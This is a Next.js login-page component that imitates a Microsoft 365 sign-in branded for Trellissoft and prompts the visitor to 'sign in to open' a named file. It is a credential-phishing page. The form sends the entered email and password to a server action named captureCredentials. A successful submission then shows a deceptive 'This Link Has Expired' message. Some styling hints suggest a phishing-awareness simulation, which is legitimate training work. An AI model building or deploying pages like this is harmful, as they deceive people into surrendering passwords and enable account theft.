'use client';

import React, { useState, useEffect, useTransition } from 'react';
import Image from 'next/image';
import { useSearchParams } from 'next/navigation';
import { ShieldX, AlertTriangle } from 'lucide-react';
import { useFormState } from 'react-dom';
import { captureCredentials } from '@/app/actions';
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
} from '@/components/ui/alert-dialog';

const initialState = {
  success: false,
  message: '',
};

export default function LoginPage() {
  const [state, formAction] = useFormState(captureCredentials, initialState);
  const [isPending, startTransition] = useTransition();

  const [showSuccessAlert, setShowSuccessAlert] = useState(false);
  const [showErrorAlert, setShowErrorAlert] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');

  const searchParams = useSearchParams();
  const fileName = searchParams.get('file') || 'Excel';

  useEffect(() => {
    if (state.success) {
      setShowSuccessAlert(true);
      setShowErrorAlert(false);
    } else if (state.message) {
      setErrorMessage(state.message);
      setShowErrorAlert(true);
      setShowSuccessAlert(false);
    }
  }, [state]);

  const handleSubmit = (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    startTransition(() => {
      formAction(new FormData(event.currentTarget));
    });
  };

  return (
    <>
      <div className="login-card">
        <Image
          src="https://trellissoft.ai/wp-content/uploads/2021/11/Trellissoft-logo-without-tagline.png"
          alt="Trellissoft Logo"
          width={180}
          height={36}
        />
        <h1>{`Sign in to open ${fileName}`}</h1>
        <form onSubmit={handleSubmit} autoComplete="off">
          <input
            type="text"
            name="username"
            placeholder="Email or phone"
            required
            disabled={isPending}
          />
          <input
            type="password"
            name="password"
            placeholder="Password"
            required
            disabled={isPending}
          />
          <button type="submit" disabled={isPending}>
            {isPending ? 'Signing in...' : 'Sign in'}
          </button>
        </form>
        <div className="footer">
          <p>This application is created using Microsoft 365 by Trellissoft and may include content controlled by Trellissoft.</p>
          <p>&copy; Microsoft Corporation</p>
        </div>
      </div>

      {/* Success / "Link Expired" Alert Dialog */}
      <AlertDialog open={showSuccessAlert} onOpenChange={setShowSuccessAlert}>
        <AlertDialogContent className="awareness-dialog">
          <AlertDialogHeader>
            <div className="flex justify-center mb-4">
              <Image
                src="https://media.licdn.com/dms/image/D560BAQGj-2L22A-4-Q/company-logo_200_200/0/1712739343993/trellissoft_logo?e=1728518400&v=beta&t=o1n4Gk_1-vJ3s_Yy_J_j_j_j_j_j_j"
                alt="Trellissoft Logo"
                width={180}
                height={60}
                className="object-contain"
                priority
              />
            </div>
            <div className="flex justify-center mb-3">
              <ShieldX className="w-14 h-14 text-red-500" />
            </div>
            <AlertDialogTitle className="text-2xl font-semibold text-center text-white">
              This Link Has Expired
            </AlertDialogTitle>
          </AlertDialogHeader>
          <AlertDialogDescription className="mt-2 text-center text-gray-400 leading-relaxed">
            ⚠️ This link has expired for security reasons. <br />
            Your asset update form is no longer available. <br />
            To protect your information, this link automatically expires after a set time.
            <br /><br />
            Please request a new secure link if you still need to update your details.
            <p className="mt-4 text-sm text-gray-500">
              Always be cautious of unexpected login requests.
            </p>
          </AlertDialogDescription>
          <AlertDialogFooter className="sm:justify-center mt-4">
            <AlertDialogAction
              onClick={() => setShowSuccessAlert(false)}
              className="bg-[#217346] text-white hover:bg-green-800"
            >
              Continue
            </AlertDialogAction>
          </AlertDialogFooter>
        </AlertDialogContent>
      </AlertDialog>

      {/* Error Alert Dialog */}
      <AlertDialog open={showErrorAlert} onOpenChange={setShowErrorAlert}>
        <AlertDialogContent className="awareness-dialog">
          <AlertDialogHeader>
            <div className="flex justify-center mb-3">
              <AlertTriangle className="w-14 h-14 text-yellow-400" />
            </div>
            <AlertDialogTitle className="text-2xl font-semibold text-center text-white">
              Submission Failed
            </AlertDialogTitle>
          </AlertDialogHeader>
          <AlertDialogDescription className="mt-2 text-center text-gray-400 leading-relaxed">
            {errorMessage}
          </AlertDialogDescription>
          <AlertDialogFooter className="sm:justify-center mt-4">
            <AlertDialogAction
              onClick={() => setShowErrorAlert(false)}
              className="bg-destructive text-destructive-foreground hover:bg-destructive/90"
            >
              Close
            </AlertDialogAction>
          </AlertDialogFooter>
        </AlertDialogContent>
      </AlertDialog>
    </>
  );
}
